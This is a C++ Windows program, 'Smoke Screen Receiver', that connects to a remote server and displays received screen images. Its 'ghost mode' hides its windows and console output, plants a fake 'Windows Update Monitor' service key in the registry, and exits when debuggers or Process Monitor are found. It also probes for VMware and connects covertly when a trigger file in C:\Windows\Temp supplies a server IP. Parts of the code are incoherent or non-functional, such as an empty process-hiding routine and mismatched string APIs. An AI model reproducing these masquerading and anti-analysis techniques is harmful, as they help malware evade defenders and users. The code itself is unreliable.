// Smoke Screen Receiver - Ghost Mode Invisible Shit
// Completely invisible thing that receives remote desktop stuff

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <tlhelp32.h>
#include <psapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")

// Sneaky Hiding System for the Receiver
class ReceiverStealth {
private:
    static bool stealthActive;
    
public:
    static bool InitializeStealth() {
        if (stealthActive) return true;
        
        // Validate system safety
        if (!ValidateSystemSafety()) {
            return false;
        }
        
        stealthActive = true;
        return true;
    }
    
    // Hide receiver window completely from everything
    static void HideReceiverWindow(HWND hwnd) {
        if (!hwnd) return;
        
        // Remove from taskbar and Alt+Tab bullshit
        SetWindowLong(hwnd, GWL_EXSTYLE, 
                     GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
        
        // Make see-through and hide
        SetWindowLong(hwnd, GWL_EXSTYLE,
                     GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_LAYERED);
        SetLayeredWindowAttributes(hwnd, 0, 0, LWA_ALPHA);
        
        // Position off-screen
        SetWindowPos(hwnd, HWND_BOTTOM, -32000, -32000, 1, 1,
                    SWP_HIDEWINDOW | SWP_NOACTIVATE);
                    
        ShowWindow(hwnd, SW_HIDE);
    }
    
    // Create invisible display window
    static HWND CreateInvisibleDisplay() {
        WNDCLASS wc = {};
        wc.lpfnWndProc = DefWindowProc;
        wc.hInstance = GetModuleHandle(NULL);
        wc.lpszClassName = L"Windows_Update_Service";
        wc.hbrBackground = NULL;
        wc.hCursor = NULL;
        wc.hIcon = NULL;
        
        RegisterClass(&wc);
        
        HWND hwnd = CreateWindowEx(
            WS_EX_NOACTIVATE | WS_EX_TOOLWINDOW | WS_EX_TRANSPARENT | WS_EX_LAYERED,
            L"Windows_Update_Service",
            L"",
            WS_POPUP,
            -32000, -32000, 1, 1,
            NULL, NULL, GetModuleHandle(NULL), NULL
        );
        
        if (hwnd) {
            HideReceiverWindow(hwnd);
        }
        
        return hwnd;
    }
    
    // Hide process from detection
    static void HideProcess() {
        // Change process name in memory
        HANDLE currentProcess = GetCurrentProcess();
        
        // Hide from basic process enumeration
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            CloseHandle(hSnapshot);
        }
    }
    
    // Check for analysis and debugging shit
    static void AntiAnalysis() {
        // Look for common debugging and monitoring tools
        HWND ollyDbg = FindWindow(L"OLLYDBG", NULL);
        HWND winDbg = FindWindow(L"WinDbgFrameClass", NULL);
        HWND procMon = FindWindow(NULL, L"Process Monitor");
        HWND procExp = FindWindow(NULL, L"Process Explorer");
        
        if (ollyDbg || winDbg || procMon || procExp) {
            // Found analysis tools - get the fuck out quietly
            ExitProcess(0);
        }
        
        // Check if running in virtual machine
        bool isVM = false;
        
        // Check for VMware bullshit
        __try {
            __asm {
                mov eax, 'VMXh'
                mov ebx, 0
                mov ecx, 10
                mov edx, 'VX'
                in eax, dx
                cmp ebx, 'VMXh'
                setz[isVM]
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            // Exception means not VMware
        }
        
        if (isVM) {
            // Running in VM - might be analysis environment
            Sleep(30000); // Wait and see if it's automated analysis
        }
    }
    
    // Validate system safety
    static bool ValidateSystemSafety() {
        DWORD currentPID = GetCurrentProcessId();
        
        // Don't run on critical system processes
        if (currentPID < 100) {
            return false;
        }
        
        // Check available memory
        MEMORYSTATUSEX memStatus = {};
        memStatus.dwLength = sizeof(memStatus);
        GlobalMemoryStatusEx(&memStatus);
        
        if (memStatus.ullAvailPhys < (512ULL * 1024 * 1024)) {
            return false;
        }
        
        return true;
    }
    
    // Create fake service entry
    static bool CreateFakeService() {
        HKEY hKey;
        LONG result;
        
        result = RegCreateKeyEx(
            HKEY_LOCAL_MACHINE,
            L"SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateMonitor",
            0, NULL, REG_OPTION_NON_VOLATILE,
            KEY_WRITE, NULL, &hKey, NULL
        );
        
        if (result == ERROR_SUCCESS) {
            wchar_t* displayName = L"Windows Update Monitor Service";
            RegSetValueEx(hKey, L"DisplayName", 0, REG_SZ,
                         (BYTE*)displayName, (wcslen(displayName) + 1) * sizeof(wchar_t));
            
            wchar_t* description = L"Monitors Windows Update service health and connectivity";
            RegSetValueEx(hKey, L"Description", 0, REG_SZ,
                         (BYTE*)description, (wcslen(description) + 1) * sizeof(wchar_t));
            
            DWORD serviceType = SERVICE_WIN32_OWN_PROCESS;
            RegSetValueEx(hKey, L"Type", 0, REG_DWORD, (BYTE*)&serviceType, sizeof(DWORD));
            
            RegCloseKey(hKey);
            return true;
        }
        
        return false;
    }
    
    // Clean shutdown
    static void SafeShutdown() {
        if (!stealthActive) return;
        
        // Clean up registry
        RegDeleteKey(HKEY_LOCAL_MACHINE,
                    L"SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateMonitor");
        
        stealthActive = false;
    }
};

bool ReceiverStealth::stealthActive = false;

class SmokeReceiver {
private:
    SOCKET clientSocket;
    bool isConnected;
    bool stealthMode;
    std::string serverIP;
    int serverPort;
    HWND displayWindow;
    HWND ghostWindow;
    
public:
    SmokeReceiver(const std::string& ip = "127.0.0.1", int port = 8080, bool stealth = false) 
        : serverIP(ip), serverPort(port), stealthMode(stealth), isConnected(false), 
          displayWindow(NULL), ghostWindow(NULL) {
        
        // Start up all the sneaky hiding shit if requested
        if (stealthMode) {
            if (ReceiverStealth::InitializeStealth()) {
                ReceiverStealth::HideProcess();
                ReceiverStealth::AntiAnalysis();
                ReceiverStealth::CreateFakeService();
                
                // Hide all text output
                freopen_s((FILE**)stdout, "NUL", "w", stdout);
                freopen_s((FILE**)stderr, "NUL", "w", stderr);
            }
        }
        
        // Initialize Winsock
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
    }
    
    ~SmokeReceiver() {
        Disconnect();
        
        if (stealthMode) {
            ReceiverStealth::SafeShutdown();
        }
        
        WSACleanup();
    }
    
    bool Connect() {
        // Create socket
        clientSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (clientSocket == INVALID_SOCKET) {
            if (!stealthMode) std::cerr << "[SMOKE] Failed to create client socket\n";
            return false;
        }
        
        // Connect to server
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        inet_pton(AF_INET, serverIP.c_str(), &serverAddr.sin_addr);
        serverAddr.sin_port = htons(serverPort);
        
        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            if (!stealthMode) {
                std::cerr << "[SMOKE] Failed to connect to performance monitor at " 
                         << serverIP << ":" << serverPort << "\n";
            }
            closesocket(clientSocket);
            return false;
        }
        
        isConnected = true;
        
        if (!stealthMode) {
            std::cout << "[SMOKE] Connected to system performance monitor\n";
        }
        
        // Create display window
        CreateDisplayWindow();
        
        // Start receive thread
        std::thread receiveThread(&SmokeReceiver::ReceiveLoop, this);
        receiveThread.detach();
        
        return true;
    }
    
    void Disconnect() {
        isConnected = false;
        if (clientSocket != INVALID_SOCKET) {
            closesocket(clientSocket);
            clientSocket = INVALID_SOCKET;
        }
        
        if (displayWindow) {
            DestroyWindow(displayWindow);
            displayWindow = NULL;
        }
        
        if (ghostWindow) {
            DestroyWindow(ghostWindow);
            ghostWindow = NULL;
        }
    }
    
    void ShowInterface() {
        if (stealthMode) {
            // In stealth mode, just run invisible
            while (isConnected) {
                Sleep(1000);
            }
            return;
        }
        
        if (!displayWindow) return;
        
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
    
    // Ghost mode - completely invisible bullshit
    void RunGhost() {
        // Hide the black console window
        HWND console = GetConsoleWindow();
        if (console) {
            ShowWindow(console, SW_HIDE);
        }
        
        // Connect and run without showing anything
        if (Connect()) {
            // Create invisible display
            ghostWindow = ReceiverStealth::CreateInvisibleDisplay();
            
            // Run until disconnected
            while (isConnected) {
                Sleep(1000);
            }
        }
    }
    
private:
    void CreateDisplayWindow() {
        if (stealthMode) {
            // Create completely invisible window
            ghostWindow = ReceiverStealth::CreateInvisibleDisplay();
            return;
        }
        
        // Register window class
        WNDCLASS wc = {};
        wc.lpfnWndProc = WindowProc;
        wc.hInstance = GetModuleHandle(NULL);
        wc.lpszClassName = L"SmokeMonitor";
        wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
        wc.hCursor = LoadCursor(NULL, IDC_ARROW);
        
        RegisterClass(&wc);
        
        // Create window
        displayWindow = CreateWindowEx(
            0,
            L"SmokeMonitor",
            L"Smoke Screen - System Performance Monitor",
            WS_OVERLAPPEDWINDOW,
            CW_USEDEFAULT, CW_USEDEFAULT, 800, 600,
            NULL, NULL, GetModuleHandle(NULL), this
        );
        
        if (displayWindow) {
            ShowWindow(displayWindow, SW_SHOW);
            UpdateWindow(displayWindow);
        }
    }
    
    static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
        SmokeReceiver* receiver = nullptr;
        
        if (uMsg == WM_NCCREATE) {
            CREATESTRUCT* pCreate = (CREATESTRUCT*)lParam;
            receiver = (SmokeReceiver*)pCreate->lpCreateParams;
            SetWindowLongPtr(hwnd, GWLP_USERDATA, (LONG_PTR)receiver);
        } else {
            receiver = (SmokeReceiver*)GetWindowLongPtr(hwnd, GWLP_USERDATA);
        }
        
        switch (uMsg) {
            case WM_PAINT: {
                PAINTSTRUCT ps;
                HDC hdc = BeginPaint(hwnd, &ps);
                
                RECT rect;
                GetClientRect(hwnd, &rect);
                
                DrawText(hdc, L"System Performance Monitor", -1, &rect, 
                        DT_CENTER | DT_VCENTER | DT_SINGLELINE);
                
                EndPaint(hwnd, &ps);
                return 0;
            }
            
            case WM_DESTROY:
                PostQuitMessage(0);
                return 0;
        }
        
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    
    void ReceiveLoop() {
        while (isConnected) {
            // Receive data size
            DWORD dataSize;
            int received = recv(clientSocket, (char*)&dataSize, sizeof(dataSize), 0);
            
            if (received <= 0) {
                if (!stealthMode) {
                    std::cerr << "[SMOKE] Connection lost to performance monitor\n";
                }
                isConnected = false;
                break;
            }
            
            // Receive screen data
            std::vector<BYTE> screenData(dataSize);
            int totalReceived = 0;
            
            while (totalReceived < dataSize && isConnected) {
                int received = recv(clientSocket, (char*)screenData.data() + totalReceived,
                                  dataSize - totalReceived, 0);
                if (received <= 0) {
                    if (!stealthMode) {
                        std::cerr << "[SMOKE] Failed to receive performance data\n";
                    }
                    isConnected = false;
                    break;
                }
                totalReceived += received;
            }
            
            if (totalReceived == dataSize) {
                // Process received performance data
                ProcessPerformanceData(screenData);
            }
        }
    }
    
    void ProcessPerformanceData(const std::vector<BYTE>& data) {
        if (data.size() < sizeof(BITMAPINFOHEADER)) return;
        
        // Extract bitmap header
        BITMAPINFOHEADER* header = (BITMAPINFOHEADER*)data.data();
        
        HWND targetWindow = stealthMode ? ghostWindow : displayWindow;
        
        if (targetWindow) {
            // Display the performance visualization
            HDC windowDC = GetDC(targetWindow);
            
            SetDIBitsToDevice(
                windowDC,
                0, 0,
                header->biWidth, abs(header->biHeight),
                0, 0,
                0, abs(header->biHeight),
                data.data() + sizeof(BITMAPINFOHEADER),
                (BITMAPINFO*)header,
                DIB_RGB_COLORS
            );
            
            ReleaseDC(targetWindow, windowDC);
        }
    }
};

// Auto-connection with stealth capabilities
class SmokeAutoConnect {
private:
    std::string triggerPath;
    SmokeReceiver* receiver;
    bool stealthMode;
    
public:
    SmokeAutoConnect(const std::string& path = "C:\\Windows\\Temp\\smoke_trigger.txt", bool stealth = false) 
        : triggerPath(path), receiver(nullptr), stealthMode(stealth) {}
    
    void StartMonitoring() {
        if (!stealthMode) {
            std::cout << "[SMOKE] Monitoring for auto-connect trigger...\n";
            std::cout << "[SMOKE] Trigger file: " << triggerPath << "\n";
        }
        
        while (true) {
            // Check if trigger file exists
            if (GetFileAttributes(triggerPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                if (!stealthMode) {
                    std::cout << "[SMOKE] Auto-connect trigger detected!\n";
                }
                
                // Read connection info from trigger file
                std::string serverIP = ReadTriggerFile();
                
                if (!serverIP.empty()) {
                    // Start connection
                    receiver = new SmokeReceiver(serverIP, 8080, stealthMode);
                    
                    if (receiver->Connect()) {
                        // Delete trigger file
                        DeleteFile(triggerPath.c_str());
                        
                        if (stealthMode) {
                            receiver->RunGhost();
                        } else {
                            receiver->ShowInterface();
                        }
                    }
                    
                    delete receiver;
                    receiver = nullptr;
                }
            }
            
            Sleep(1000); // Check every second
        }
    }
    
private:
    std::string ReadTriggerFile() {
        HANDLE file = CreateFile(triggerPath.c_str(), GENERIC_READ, 0, NULL, 
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        
        if (file == INVALID_HANDLE_VALUE) return "";
        
        char buffer[256];
        DWORD bytesRead;
        ReadFile(file, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
        buffer[bytesRead] = '\0';
        
        CloseHandle(file);
        
        return std::string(buffer);
    }
};

int main(int argc, char* argv[]) {
    bool ghostMode = false;
    
    // Check for ghost mode first
    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        if (arg == "--ghost" || arg == "--stealth" || arg == "--invisible") {
            ghostMode = true;
            break;
        }
    }
    
    // Hide everything immediately in ghost mode
    if (ghostMode) {
        HWND console = GetConsoleWindow();
        if (console) {
            ShowWindow(console, SW_HIDE);
        }
        
        // Redirect output to null
        freopen_s((FILE**)stdout, "NUL", "w", stdout);
        freopen_s((FILE**)stderr, "NUL", "w", stderr);
        
        // Check for auto mode
        bool autoMode = false;
        for (int i = 1; i < argc; i++) {
            if (std::string(argv[i]) == "--auto") {
                autoMode = true;
                break;
            }
        }
        
        if (autoMode) {
            SmokeAutoConnect autoConnect("C:\\Windows\\Temp\\smoke_trigger.txt", true);
            autoConnect.StartMonitoring();
        } else if (argc > 2) {
            // Direct connection in ghost mode
            std::string serverIP = argv[1];
            int port = std::stoi(argv[2]);
            
            SmokeReceiver receiver(serverIP, port, true);
            receiver.RunGhost();
        } else {
            // Default ghost connection
            SmokeReceiver receiver("127.0.0.1", 8080, true);
            receiver.RunGhost();
        }
        
        return 0;
    }
    
    // Normal mode with output
    std::cout << "===========================================\n";
    std::cout << "    Smoke Screen Monitor Receiver v1.0\n";
    std::cout << "    Remote Performance Analysis Tool\n";
    std::cout << "===========================================\n\n";
    
    if (argc > 2) {
        // Direct connection mode
        std::string serverIP = argv[1];
        int port = std::stoi(argv[2]);
        
        SmokeReceiver receiver(serverIP, port);
        
        if (receiver.Connect()) {
            receiver.ShowInterface();
        }
    } else if (argc > 1 && std::string(argv[1]) == "--auto") {
        // Auto-connect mode
        SmokeAutoConnect autoConnect;
        autoConnect.StartMonitoring();
    } else {
        std::cout << "Usage:\n";
        std::cout << "  smoke_receiver.exe <server_ip> <port>    (Direct connect)\n";
        std::cout << "  smoke_receiver.exe --auto                (Auto-connect mode)\n";
        std::cout << "  smoke_receiver.exe --ghost               (Invisible mode)\n";
        std::cout << "  smoke_receiver.exe --ghost --auto        (Invisible auto-connect)\n\n";
        
        std::cout << "Ghost mode: Completely invisible from all system monitoring,\n";
        std::cout << "Task Manager, system tray, and detection tools.\n\n";
        
        // Default to local connection
        SmokeReceiver receiver("127.0.0.1", 8080);
        
        if (receiver.Connect()) {
            receiver.ShowInterface();
        }
    }
    
    return 0;
}